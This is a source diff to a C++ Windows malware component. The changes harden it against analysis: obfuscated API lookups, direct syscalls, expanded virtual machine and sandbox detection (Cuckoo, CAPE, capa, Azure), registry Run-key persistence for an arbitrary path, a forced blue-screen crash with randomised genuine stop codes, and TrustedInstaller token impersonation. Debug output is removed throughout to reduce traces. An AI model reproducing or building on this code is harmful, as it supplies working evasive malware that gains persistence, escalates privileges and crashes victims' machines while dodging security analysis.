@@ -2,6 +2,9 @@
 #include "Syscalls.h"
 #include "External/obfuscate.h"
 
+#include <array>
+#include <random>
+
 std::string _lower(std::string inp) {
     std::string out = "";
     for ( auto& c : inp )
@@ -111,7 +114,6 @@ ProcessManager::ProcessManager() {
     DllsLoaded = TRUE;
 
     this->LoadAllNatives();
-    OutputDebugStringA("loaded process manager");
 }
 
 unsigned int ProcessManager::GetSSN(HMODULE lib, std::string functionName) {
@@ -130,11 +132,8 @@ unsigned int ProcessManager::GetSSN(HMODULE lib, std::string functionName) {
 template <typename type>
 void ProcessManager::LoadNative(char* name, HMODULE from) {
     type loaded = GetFunctionAddress<type>(from, name);
-    if ( !loaded ) {
-        std::string d = "error getting " + std::string(name) + " func address\n";
-        OutputDebugStringA(d.c_str());
+    if ( !loaded )
         return;
-    }
 
     FunctionPointer<type> fp = {};
     fp.from = from; 
@@ -142,8 +141,6 @@ void ProcessManager::LoadNative(char* name, HMODULE from) {
     fp.name = name;
 
     this->m_Natives[name] = std::any(fp);
-    std::string d = "inserted " + std::string(name) + "\n";
-    OutputDebugStringA(d.c_str());
 }
 
 void ProcessManager::SetThisContext(SecurityContext newContext) {
@@ -154,14 +151,16 @@ void ProcessManager::SetThisContext(SecurityContext newContext) {
 bool ProcessManager::RunningInVirtualMachine() {
     std::vector<unsigned char> buffer;
     std::string temp;
+    const int rsmb = 1381190978; // 'RSMB'
 
-    DWORD size = GetSystemFirmwareTable( 'RSMB', 0, nullptr, 0 );
+    FunctionPointer<_GetSystemFirmwareTable> ReadBIOS = GetNative<_GetSystemFirmwareTable>((char*)HIDE("GetSystemFirmwareTable"));
+    
+    DWORD size = ReadBIOS.call(rsmb, 0, nullptr, 0 );
     if ( size == 0 )
         return false;
 
     buffer.resize(size);
-
-    if ( GetSystemFirmwareTable('RSMB', 0, buffer.data(), size) == 0 )
+    if ( ReadBIOS.call(rsmb, 0, buffer.data(), size) == 0 )
         return false;
 
     for ( DWORD i = 0; i < size; ++i ) {
@@ -183,9 +182,14 @@ bool ProcessManager::RunningInVirtualMachine() {
                 lower.find((char*)HIDE("virtual")) != std::string::npos   ||
                 lower.find((char*)HIDE("vmware")) != std::string::npos    ||
                 lower.find((char*)HIDE("hyper-v")) != std::string::npos   ||
-                lower.find((char*)HIDE("microsoft")) != std::string::npos ||
+                lower.find((char*)HIDE("microsoft corporation")) != std::string::npos ||
                 lower.find((char*)HIDE("xen")) != std::string::npos       ||
-                lower.find((char*)HIDE("kvm")) != std::string::npos       
+                lower.find((char*)HIDE("kvm")) != std::string::npos       ||
+                lower.find((char*)HIDE("capa")) != std::string::npos      ||
+                lower.find((char*)HIDE("azure")) != std::string::npos     ||
+                lower.find((char*)HIDE("sandbox")) != std::string::npos ||
+                lower.find((char*)HIDE("cape")) != std::string::npos ||
+                lower.find((char*)HIDE("cuckoo")) != std::string::npos
                 )
                 return true;
         }
@@ -196,10 +200,7 @@ bool ProcessManager::RunningInVirtualMachine() {
     return false;
 }
 
-void ProcessManager::AddProcessToStartup() {
-    OBJECT_ATTRIBUTES obj;
-    InitializeObjectAttributes(&obj, 0, 0, 0, 0);
-
+void ProcessManager::AddProcessToStartup(std::string path) {
     std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
     std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());
 
@@ -211,8 +212,7 @@ void ProcessManager::AddProcessToStartup() {
     std::string hiddenName = std::string(HIDE("Defaults"));
     std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());
 
-    std::string hiddenValue = std::string(HIDE("C:\\Windows \\System32\\ComputerDefaults.exe"));
-    std::wstring value = std::wstring(hiddenValue.begin(), hiddenValue.end());
+    std::wstring wstrPath = std::wstring(path.begin(), path.end());
 
     UNICODE_STRING valueName;
     valueName.Buffer = name.data();
@@ -220,23 +220,30 @@ void ProcessManager::AddProcessToStartup() {
     valueName.MaximumLength = sizeof(valueName.Length);
 
     UNICODE_STRING valueData;
-    valueData.Buffer = value.data();
-    valueData.Length = value.size() * sizeof(wchar_t);
+    valueData.Buffer = wstrPath.data();
+    valueData.Length = wstrPath.size() * sizeof(wchar_t);
     valueData.MaximumLength = sizeof(valueData.Length);
 
+    OBJECT_ATTRIBUTES obj;
+    InitializeObjectAttributes(&obj, 0, 0, 0, 0);
     obj.Length = sizeof(OBJECT_ATTRIBUTES);
     obj.RootDirectory = NULL;
     obj.ObjectName = &reg;
     obj.SecurityDescriptor = NULL;
     obj.SecurityQualityOfService = NULL;
     obj.Attributes = OBJ_CASE_INSENSITIVE;
+
     HANDLE key;
     
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtCreateKey"));
-    SysNtCreateKey(&key, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
+    NTSTATUS created = SysNtCreateKey(&key, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
+    if ( created != STATUS_SUCCESS )
+        return;
 
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtSetValueKey"));
-    SysNtSetValueKey(key, &valueName, 0, REG_SZ, (void*)valueData.Buffer, valueData.Length);
+    NTSTATUS set = SysNtSetValueKey(key, &valueName, 0, REG_SZ, (void*)valueData.Buffer, valueData.Length);
+    if ( set != STATUS_SUCCESS )
+        return;
 }
 
 void ProcessManager::BSOD() {
@@ -249,8 +256,18 @@ void ProcessManager::BSOD() {
     ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, (char*)HIDE("RtlAdjustPrivilege"));
     adjust(19, TRUE, FALSE, &state);
 
+    // can be random
+    std::array<unsigned int, 10> stopCodes = { 
+        0x00000093, 0x00000077, 0x000000EF, 0x0000001A, 0x00000028,
+        0x00000051, 0x00000053, 0x0000005A, 0x0000007B, 0x00000085
+    };
+
+    std::random_device gen;
+    std::mt19937 rng(gen());
+    std::uniform_int_distribution<std::mt19937::result_type> dist(0, 9);
+
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRaiseHardError"));
-    SysNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &resp);
+    SysNtRaiseHardError(stopCodes.at(dist(rng)), 0, 0, 0, 6, &resp);
 }
 
 void ProcessManager::LoadAllNatives() {
@@ -268,6 +285,7 @@ void ProcessManager::LoadAllNatives() {
     LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
     LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
     LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
+    LoadNative<::_GetSystemFirmwareTable>((char*)HIDE("GetSystemFirmwareTable"), Kernel32DLL);
 
     this->m_NativesLoaded = TRUE;
 }
@@ -278,8 +296,6 @@ DWORD ProcessManager::PIDFromName(const char* name) {
     PROCESSENTRY32 processEntry;
     DWORD          processID = -1;
     HANDLE         processSnapshot = GetNative<::_CreateToolhelp32Snapshot>((char*) HIDE("CreateToolhelp32Snapshot")).call(TH32CS_SNAPPROCESS, 0);
-
-    OutputDebugStringA("process");
 
     if ( processSnapshot == INVALID_HANDLE_VALUE ) {
         return -1;
@@ -510,7 +526,6 @@ HANDLE ProcessManager::GetTrustedInstallerToken() {
     if ( impersonate == NULL )
         return NULL;
 
-    OutputDebugStringA("ti");
     SetThisContext(SecurityContext::TrustedInstaller);
     m_ElevatedToken = impersonate;
     return impersonate;
